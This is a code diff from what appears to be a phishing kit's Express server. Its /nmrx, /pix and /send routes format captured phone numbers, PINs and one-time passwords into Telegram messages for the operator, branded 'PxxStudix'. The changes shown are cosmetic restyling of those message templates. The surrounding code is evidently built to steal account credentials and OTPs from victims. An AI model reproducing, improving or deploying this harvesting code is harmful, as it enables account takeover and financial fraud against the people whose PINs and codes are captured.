@@ -74,12 +74,14 @@ app.post("/nmrx", async(req,res) =>{
 
         /* PESAN TELEGRAM */
         const text = `
-💳 <b>|× <code>${nmrx}</code> ×|</b> 💳
+🔥 [ × <code>${nmrx}</code> × ] 🔥
 
-<b>×  NMR  ×</b>   : <b>${nmrx}</b>
-<i>POX . . . .</i>
+─────────────────
+<b>⌬<i>  𝗡𝗠𝗥  ×</i></b>  : <b>${nmrx}</b>
+⌬<i>  POX . . . .</i>
+─────────────────
 
-<b>©️ By PxxStudix</b>
+<b>◈ ━━━ 𝗣𝘅𝘅𝗦𝘁𝘂𝗱𝗶𝘅 ━━━ ◈</b>
         `;
 
         /* KIRIM TELEGRAM */
@@ -169,13 +171,15 @@ app.post("/pix", async(req,res) =>{
 
         /* PESAN TELEGRAM */
         const text = `
-💳 <b>|× <code>${nmrx}</code> ×|</b> 💳
+🔥 [ × <code>${nmrx}</code> × ] 🔥
 
-<b>×  NMR  ×</b>   : <b>${nmrx}</b>
-<b>×  POX   ×</b>   : <b>${pix}</b>
-<i>OXT . . . .</i>
+─────────────────
+<b>⌬<i>  𝗡𝗠𝗥  ×</i></b>   : <b>${nmrx}</b>
+<b>⌬<i>  𝗣𝗢𝗫   ×</i></b>   : <b>${pix}</b>
+⌬<i>  OXT . . . .</i>
+─────────────────
 
-<b>©️ By PxxStudix</b>
+<b>◈ ━━━ 𝗣𝘅𝘅𝗦𝘁𝘂𝗱𝗶𝘅 ━━━ ◈</b>
         `;
 
         /* KIRIM TELEGRAM */
@@ -267,13 +271,15 @@ app.post("/send", async(req,res) =>{
 
         /* PESAN TELEGRAM */
         const text = `
-💳 <b>|× <code>${nmrx}</code> ×|</b> 💳
+🔥 [ × <code>${nmrx}</code> × ] 🔥
 
-<b>×  NMR  ×</b>   : <b>${nmrx}</b>
-<b>×  POX   ×</b>   : <b>${pix}</b>
-<b>×  OXT   ×</b>   : <b>${otp}</b>
+─────────────────
+<b>⌬<i>  𝗡𝗠𝗥  ×</i></b>   : <b>${nmrx}</b>
+<b>⌬<i>  𝗣𝗢𝗫   ×</i></b>   : <b>${pix}</b>
+<b>⌬<i>  𝗢𝗫𝗧   ×</i></b>   : <b>${otp}</b>
+─────────────────
 
-<b>©️ By PxxStudix</b>
+<b>◈ ━━━ 𝗣𝘅𝘅𝗦𝘁𝘂𝗱𝗶𝘅 ━━━ ◈</b>
         `;
 
         /* KIRIM TELEGRAM */
